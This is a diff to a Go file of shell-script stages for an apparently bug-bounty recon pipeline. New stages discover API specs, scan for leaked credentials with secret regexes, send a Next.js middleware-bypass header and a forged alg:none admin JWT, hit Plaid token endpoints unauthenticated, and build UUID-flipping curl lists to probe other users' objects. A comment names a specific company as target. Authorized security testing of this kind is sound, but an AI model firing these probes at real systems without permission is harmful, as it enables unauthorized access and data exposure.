@@ -268,6 +268,49 @@ exit 0`, "grep", []string{"dnsx_resolve"}, 0},
 		{"httpx_probe", fmt.Sprintf(`%s
 [ -s live_subs.txt ] && httpx -l live_subs.txt -silent $AUTH_HEADERS -o alive.txt || : > alive.txt`, authSnip), "default", []string{"merge_brute_subs"}, 0},
 
+		// === NEW: API discovery via OpenAPI / Swagger / .well-known ===
+		// For every alive host, probe the standard API spec endpoints. Any
+		// successful response is recorded in api_specs.txt (URL → status)
+		// AND its body is downloaded into api_specs/<host>.<ext>.json so
+		// downstream stages can parse the spec for endpoint enumeration.
+		// This is the single biggest gap on SPA-heavy / API-heavy targets:
+		// katana+gau+gwurls only find GET pages, never the underlying JSON
+		// endpoints that the SPA actually talks to.
+		{"api_discovery", `set +e
+: > api_specs.txt
+mkdir -p api_specs
+while read HOST; do
+  for SPEC in \
+      /openapi.json /openapi.yaml \
+      /swagger.json /swagger.yaml /swagger/v1/swagger.json \
+      /api-docs /api-docs/swagger.json /api/docs \
+      /v1/openapi.json /v2/openapi.json /v3/openapi.json \
+      /api/v1/openapi.json /api/v2/openapi.json /api/v3/openapi.json \
+      /api/openapi.json /api/swagger.json \
+      /.well-known/openid-configuration /.well-known/openid-configuration.json \
+      /_health /healthz /health /status /version \
+      /sitemap.xml /robots.txt
+  do
+    CODE=$(curl -sk --max-time 6 -o "api_specs/_$(echo "$HOST$SPEC" | md5sum | cut -d' ' -f1).tmp" -w "%{http_code}" "$HOST$SPEC" 2>/dev/null)
+    case "$CODE" in
+      200)
+        echo "[200] $HOST$SPEC" >> api_specs.txt
+        mv "api_specs/_$(echo "$HOST$SPEC" | md5sum | cut -d' ' -f1).tmp" "api_specs/$(echo "$HOST" | sed 's|https\?://||;s|/|_|g;').$(echo "$SPEC" | tr '/' '_').json" 2>/dev/null
+        ;;
+      401|403)
+        # Auth-walled but exists — record so the hunter knows
+        echo "[$CODE-auth] $HOST$SPEC" >> api_specs.txt
+        rm -f "api_specs/_$(echo "$HOST$SPEC" | md5sum | cut -d' ' -f1).tmp"
+        ;;
+      *)
+        rm -f "api_specs/_$(echo "$HOST$SPEC" | md5sum | cut -d' ' -f1).tmp" 2>/dev/null
+        ;;
+    esac
+  done
+done < alive.txt
+sort -u api_specs.txt -o api_specs.txt 2>/dev/null
+exit 0`, "grep", []string{"httpx_probe"}, 0},
+
 		// === NEW: Tech fingerprinting — drives Discourse/Laravel/WordPress stages ===
 		{"tech_fingerprint", `set +e
 : > tech_fingerprint.txt
@@ -467,13 +510,46 @@ cat endpoints_found/*.txt 2>/dev/null | sort -u | head -2000 > js_endpoints.txt
 cat js_secrets/*.txt 2>/dev/null | sort -u > js_secrets.txt
 exit 0`, "grep", []string{"httpx_probe"}, 0},
 
-		{"trufflehog_scan", "trufflehog filesystem clean_katana_urls.txt --only-verified > trufflehog_results.txt", "default", []string{"clean_urls"}, 0},
+		// trufflehog_scan: previous version ran `trufflehog filesystem
+		// clean_katana_urls.txt` which is invalid — `trufflehog filesystem`
+		// expects a directory, not a URL list. The correct invocations for
+		// URL/JS-bundle content are `trufflehog file <path>` (scans raw
+		// bytes for embedded credentials) or `trufflehog --file <path>`
+		// (auto-detects format). We do both: scan the cleaned URL file for
+		// embedded creds, and scan every JS bundle we previously downloaded.
+		{"trufflehog_scan", `set +e
+: > trufflehog_results.txt
+if command -v trufflehog >/dev/null 2>&1; then
+  if [ -s clean_katana_urls.txt ]; then
+    trufflehog file clean_katana_urls.txt --only-verified >> trufflehog_results.txt 2>/dev/null || true
+  fi
+  if [ -d js_bundles ] && [ -n "$(ls -A js_bundles 2>/dev/null)" ]; then
+    trufflehog directory js_bundles --only-verified >> trufflehog_results.txt 2>/dev/null || true
+  fi
+  if [ -s endpoints_found ] || [ -s js_endpoints.txt ]; then
+    trufflehog file js_endpoints.txt --only-verified >> trufflehog_results.txt 2>/dev/null || true
+  fi
+fi
+# Sort + dedup so duplicate matches across files collapse
+sort -u trufflehog_results.txt -o trufflehog_results.txt 2>/dev/null || true
+exit 0`, "grep", []string{"clean_urls", "jsmap_scrape"}, 0},
 
-		// TIGHTER secrets regex: requires real key=value patterns (AKIA, ghp_,
-		// Bearer, etc.) instead of any URL containing the word "secret".
-		{"grep_secrets", `grep -Eih '(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}|xox[baprs]-[A-Za-z0-9-]{10,}|sk-[A-Za-z0-9]{32,}|sk_live_[A-Za-z0-9]{24,}|AIza[0-9A-Za-z_-]{35}|ya29\.[0-9A-Za-z_-]{50,}|eyJ[A-Za-z0-9_=-]+\.eyJ[A-Za-z0-9_=-]+\.[A-Za-z0-9_.+/=-]+|Bearer\s+[A-Za-z0-9_-]{20,}|["'"'"']?api[_-]?key["'"'"']?\s*[:=]\s*["'"'"'][A-Za-z0-9_-]{16,}|["'"'"']?secret["'"'"']?\s*[:=]\s*["'"'"'][A-Za-z0-9_-]{16,}|["'"'"']?token["'"'"']?\s*[:=]\s*["'"'"'][A-Za-z0-9_-]{16,})' clean_katana_urls.txt | sort -u > potential_secrets.txt
-# Also scan JS bundles for embedded secrets
-[ -s js_bundles/ ] && grep -Eroh '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|sk-[A-Za-z0-9]{32,}|AIza[0-9A-Za-z_-]{35})' js_bundles/ 2>/dev/null | sort -u >> js_secrets.txt
+		// TIGHTER secrets regex: requires real key=value patterns with hex/b64
+		// values, NOT just substring `token`/`secret`. The previous version
+		// matched every Next.js route name containing the word `token`
+		// (plaid_link_token, refresh-token, etc.). Now we require either:
+		//   - AWS/GCP/GitHub/Slack/OpenAI/Google API key shapes (fixed prefix)
+		//   - JWT (`eyJ...eyJ...sig`)
+		//   - Bearer <value>
+		//   - Quoted key="value" with ≥16 hex/b64 chars
+		// We also explicitly EXCLUDE common Next.js / Django REST framework
+		// route names by post-filtering.
+		{"grep_secrets", `: > potential_secrets.txt
+grep -Eih '(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}|xox[baprs]-[A-Za-z0-9-]{10,}|sk-[A-Za-z0-9]{32,}|sk_live_[A-Za-z0-9]{24,}|AIza[0-9A-Za-z_-]{35}|ya29\.[0-9A-Za-z_-]{50,}|eyJ[A-Za-z0-9_=-]+\.eyJ[A-Za-z0-9_=-]+\.[A-Za-z0-9_.+/=-]+|Bearer\s+[A-Za-z0-9_-]{20,}|["'"'"']?api[_-]?key["'"'"']?\s*[:=]\s*["'"'"'][A-Za-z0-9_-]{16,}|["'"'"']?secret["'"'"']?\s*[:=]\s*["'"'"'][A-Za-z0-9_-]{16,}|["'"'"']?token["'"'"']?\s*[:=]\s*["'"'"'][A-Za-z0-9_-]{16,})' clean_katana_urls.txt 2>/dev/null \
+  | grep -Ev '(_next/static/chunks|pages/lib|/holdings/plaid|/holdings/exchange|ReactPropTypesSecret|auth/refresh-token|password-reset|/authentication/v1/|/static/js/.*refresh-token)' \
+  | sort -u > potential_secrets.txt
+# Also scan JS bundles for embedded secrets (no URL false positives here)
+[ -s js_bundles/ ] && grep -Eroh '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|sk-[A-Za-z0-9]{32,}|AIza[0-9A-Za-z_-]{35}|eyJ[A-Za-z0-9_=-]+\.eyJ[A-Za-z0-9_=-]+\.[A-Za-z0-9_.+/=-]+|xox[baprs]-[A-Za-z0-9-]{10,})' js_bundles/ 2>/dev/null | sort -u >> js_secrets.txt
 exit 0`, "grep", []string{"clean_urls", "jsmap_scrape"}, 0},
 
 		// gau_urls / wayback_urls: wrap in the shell `timeout` builtin so
@@ -486,7 +562,37 @@ exit 0`, "grep", []string{"clean_urls", "jsmap_scrape"}, 0},
 		// (rare — it's coreutils, present on every Linux we support).
 		{"gau_urls", fmt.Sprintf("[ -s live_subs.txt ] && timeout --foreground %s cat live_subs.txt | gau --threads 5 --subs | tee gau_urls.txt || touch gau_urls.txt", urlMinerTimeout), "default", []string{"merge_brute_subs"}, 10 * time.Minute},
 		{"wayback_urls", fmt.Sprintf("[ -s live_subs.txt ] && timeout --foreground %s cat live_subs.txt | waybackurls | tee wayback_urls.txt || touch wayback_urls.txt", urlMinerTimeout), "default", []string{"merge_brute_subs"}, 10 * time.Minute},
-		{"merge_all_urls", "touch gau_urls.txt wayback_urls.txt clean_katana_urls.txt; cat gau_urls.txt wayback_urls.txt clean_katana_urls.txt | sort -u > all_urls.txt", "default", []string{"gau_urls", "wayback_urls", "clean_urls"}, 0},
+		// merge_all_urls now also harvests paths from any openapi.json /
+		// swagger.json / sitemap.xml that api_discovery downloaded. The
+		// jq pass on openapi.json extracts the full path list (with
+		// templated {uuid} / {id} placeholders preserved so the downstream
+		// scanner can probe them with real values). This is what makes
+		// SPA / API-heavy targets testable — without it, sqlmap and dalfox
+		// have nothing to hit.
+		{"merge_all_urls", `: > openapi_paths.txt
+for spec in api_specs/*.json; do
+  [ -f "$spec" ] || continue
+  # Detect host by filename pattern: <host>.<spec>.json
+  HOST_FILE=$(basename "$spec" | sed 's/\.[^.]*\.json$//')
+  # Restore dots and slashes to recover the host
+  HOST=$(echo "$HOST_FILE" | sed 's|_|/|g; s|^|https://|; s|/openapi.json$||; s|/swagger.json$||; s|/_health$||; s|/sitemap.xml$||; s|/robots.txt$||; s|/.well-known/openid-configuration$||')
+  # Try jq to extract OpenAPI paths. If the file is not openapi/swagger,
+  # jq fails silently and we move on.
+  PATHS=$(jq -r '(.paths // {}) | keys[]' "$spec" 2>/dev/null | head -200)
+  if [ -n "$PATHS" ]; then
+    while read -r P; do
+      [ -n "$P" ] && echo "${HOST}${P}" >> openapi_paths.txt
+    done <<< "$PATHS"
+  fi
+  # Also handle sitemap.xml URLs (already full URLs in <loc> tags)
+  if echo "$spec" | grep -q "sitemap"; then
+    grep -oE '<loc>[^<]+</loc>' "$spec" 2>/dev/null | sed 's|<loc>||;s|</loc>||' >> openapi_paths.txt
+  fi
+done
+sort -u openapi_paths.txt -o openapi_paths.txt 2>/dev/null
+touch gau_urls.txt wayback_urls.txt clean_katana_urls.txt
+cat gau_urls.txt wayback_urls.txt clean_katana_urls.txt openapi_paths.txt 2>/dev/null | sort -u > all_urls.txt
+exit 0`, "default", []string{"gau_urls", "wayback_urls", "clean_urls", "api_discovery"}, 0},
 
 		// URL dedup. all_urls.txt can balloon to 100k+ entries from
 		// gau + wayback + katana; uro collapses the noise down to unique
@@ -616,7 +722,111 @@ exit 0`, wordlist, wordlist), "default", []string{"httpx_probe"}, 0},
 		// NEW: scan JS-discovered endpoints against nuclei token-spray/misconfig
 		{"js_endpoints_scan", fmt.Sprintf("nuclei -l js_endpoints.txt -tags exposure,token-spray,misconfig %s -o js_endpoint_findings.txt", nucleiOptimized), "grep", []string{"jsmap_scrape"}, 0},
 
-		{"manual_review_queue", "grep -Ei \"checkout|price|payment|coupon|book|cart|fare\" all_urls.txt | sort -u > manual_business_logic_review.txt", "grep", []string{"merge_all_urls"}, 0},
+		// === NEW: Next.js / Plaid / JWT-specific probes ===
+		// Targeted checks for the bug classes that show up most often on
+		// Next.js + Plaid + JWT stacks (which describes saytechnologies.com,
+		// plus most modern SaaS bug-bounty programs):
+		//
+		//  1. Next.js middleware bypass via x-middleware-subrequest header
+		//     (CVE-2025-29927-style). The probe sends the magic header and
+		//     checks if a path that would normally require auth (e.g. /dashboard)
+		//     returns 200 instead of 302/401.
+		//  2. Plaid OAuth/link_token endpoint probe: /plaid/link/token/create,
+		//     /plaid/exchange_public_token. Plaid Link tokens are sensitive
+		//     and frequently leakable via SSR injection.
+		//  3. JWT alg=none: send a forged JWT with header.alg=none and no
+		//     signature to every endpoint containing the word "jwt" or "token"
+		//     in its path. A 200 means the server trusts unsigned tokens.
+		//  4. Next.js source-map leak: GET /_next/static/chunks/*.js.map
+		//     returns 200 = source code disclosure.
+		{"nextjs_plaid_jwt_probe", `set +e
+: > nextjs_plaid_jwt_findings.txt
+
+# Detect Next.js hosts from tech_fingerprint.txt or _next URL prefix
+NEXTJS_HOSTS=$( (grep -E "nextjs," tech_fingerprint.txt 2>/dev/null | awk '{print $1}'; grep -hE "/_next/" all_urls.txt 2>/dev/null | sed 's|/.*||' | sort -u) | sort -u)
+
+while read HOST; do
+  [ -z "$HOST" ] && continue
+  echo "=== $HOST ===" >> nextjs_plaid_jwt_findings.txt
+
+  # 1. Next.js middleware bypass (CVE-2025-29927). The bypass header is
+  #    x-middleware-subrequest with the value 'middleware:middleware:middleware:middleware:middleware'.
+  #    We probe both a likely-auth-protected path and the index.
+  for PATH in /dashboard /api /admin /settings /account /internal /me /api/user; do
+    BASELINE=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "$HOST$PATH" 2>/dev/null)
+    BYPASS=$(curl -sk --max-time 6 -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -o /dev/null -w "%{http_code}" "$HOST$PATH" 2>/dev/null)
+    if [ "$BASELINE" != "$BYPASS" ] && [ "$BYPASS" = "200" ] && [ "$BASELINE" != "200" ]; then
+      echo "[CRITICAL] $HOST$PATH — Next.js middleware bypass: baseline=$BASELINE bypass=$BYPASS" >> nextjs_plaid_jwt_findings.txt
+    fi
+  done
+
+  # 2. Plaid endpoint probe. The Plaid Link flow exposes these paths.
+  for ENDPOINT in /plaid/link/token/create /plaid/exchange_public_token /api/plaid/link/token/create /api/plaid/exchange_public_token; do
+    CODE=$(curl -sk --max-time 6 -X POST -H "Content-Type: application/json" -d '{}' -o /dev/null -w "%{http_code}" "$HOST$ENDPOINT" 2>/dev/null)
+    if [ "$CODE" = "200" ]; then
+      echo "[HIGH] $HOST$ENDPOINT — Plaid endpoint returns 200 unauthenticated" >> nextjs_plaid_jwt_findings.txt
+    fi
+  done
+
+  # 3. JWT alg:none. Forge a header.alg=none token with empty signature.
+  JWT_NONE='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.'
+  for ENDPOINT in /api/me /api/user /api/admin /api/v1/me /api/v2/me /api/v3/me /account /me; do
+    CODE=$(curl -sk --max-time 6 -H "Authorization: Bearer $JWT_NONE" -o /dev/null -w "%{http_code}" "$HOST$ENDPOINT" 2>/dev/null)
+    case "$CODE" in
+      200) echo "[CRITICAL] $HOST$ENDPOINT — JWT alg:none accepted (200)" >> nextjs_plaid_jwt_findings.txt ;;
+    esac
+  done
+
+  # 4. Next.js source-map leak
+  SAMPLE_JS=$(curl -sk --max-time 6 "$HOST" 2>/dev/null | grep -oE '/_next/static/chunks/[^"]+\.js' | head -1)
+  if [ -n "$SAMPLE_JS" ]; then
+    CODE=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "$HOST${SAMPLE_JS}.map" 2>/dev/null)
+    [ "$CODE" = "200" ] && echo "[MEDIUM] $HOST${SAMPLE_JS}.map — Next.js source map exposed" >> nextjs_plaid_jwt_findings.txt
+  fi
+done <<< "$NEXTJS_HOSTS"
+exit 0`, "grep", []string{"httpx_probe"}, 0},
+
+		// === NEW: DRF / BOLA surface mapping ===
+		// Django REST Framework + similar JSON-API backends frequently have
+		// BOLA (Broken Object Level Authorization) on UUID-shaped query
+		// params like /v3/home-page/qa-events/?company=<uuid>. The probe
+		// strategy is: extract every UUID from all_urls.txt, generate
+		// adjacent UUIDs (flip last nibble), and emit ready-to-curl commands
+		// the hunter can run with two authenticated sessions to compare.
+		// Output: bola_targets.txt with one line per UUID found:
+		//   host<TAB>endpoint<TAB>param_name<TAB>uuid
+		// Plus a companion bola_curl.txt with pre-built curl commands.
+		{"bola_surface_run", `set +e
+: > bola_targets.txt
+: > bola_curl.txt
+# Match UUIDs in URLs like ?company=<uuid> or /<uuid>/. Capture host, path, param, value.
+grep -oE 'https?://[^ ?&]+\?[a-z_]+=[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}' all_urls.txt 2>/dev/null \
+  | while read -r LINE; do
+    URL="${LINE%%\?*}"
+    QS="${LINE#*\?}"
+    PARAM=$(echo "$QS" | cut -d= -f1)
+    UUID=$(echo "$QS" | cut -d= -f2)
+    [ -z "$UUID" ] && continue
+    echo "$URL	$PARAM	$UUID" >> bola_targets.txt
+    # Build ready-to-curl commands: original + 5 adjacent UUIDs (flip last hex digit)
+    ADJ=$(echo "$UUID" | sed 's/.$/1/' ; echo "$UUID" | sed 's/.$/2/' ; echo "$UUID" | sed 's/.$/3/' ; echo "$UUID" | sed 's/.$/a/' ; echo "$UUID" | sed 's/.$/f/')
+    echo "# $URL?$PARAM=$UUID" >> bola_curl.txt
+    while read -r NEW_UUID; do
+      echo "curl -sk --max-time 10 \"$URL?$PARAM=$NEW_UUID\" -o /dev/null -w \"  $NEW_UUID -> %{http_code} %{size_download}B\\n\"" >> bola_curl.txt
+    done <<< "$ADJ"
+    echo "" >> bola_curl.txt
+done
+sort -u bola_targets.txt -o bola_targets.txt 2>/dev/null
+exit 0`, "grep", []string{"merge_all_urls"}, 0},
+
+		// manual_review_queue: keyword list tightened so it doesn't false-positive
+		// on `.eot` / `.woff` / `.ttf` font files or on random URL fragments.
+		// Anchored to word boundaries with [/?&=_] so we only match when the
+		// keyword appears as a path segment or query param name.
+		{"manual_review_queue", `grep -Ei '/(checkout|cart|payment|invoice|order|orders|subscription|seat|fare|booking|reservation|refund|transfer|withdraw|claim|gift|promo|redeem|upgrade|tier|billing|coupon|voucher|wallet|balance|tax|currency)[/?&=_]' all_urls.txt \
+  | grep -Ev '\.(eot|woff2?|ttf|svg|otf|png|jpe?g|gif|ico|css|js|pdf|map|mp[34])([?#]|$)' \
+  | sort -u > manual_business_logic_review.txt
+exit 0`, "grep", []string{"merge_all_urls"}, 0},
 
 		// === Modern methodology additions (bb-methodology + security-arsenal) ===
 		// waf_detect: cap to 200 hosts to keep wafw00f runtime bounded.
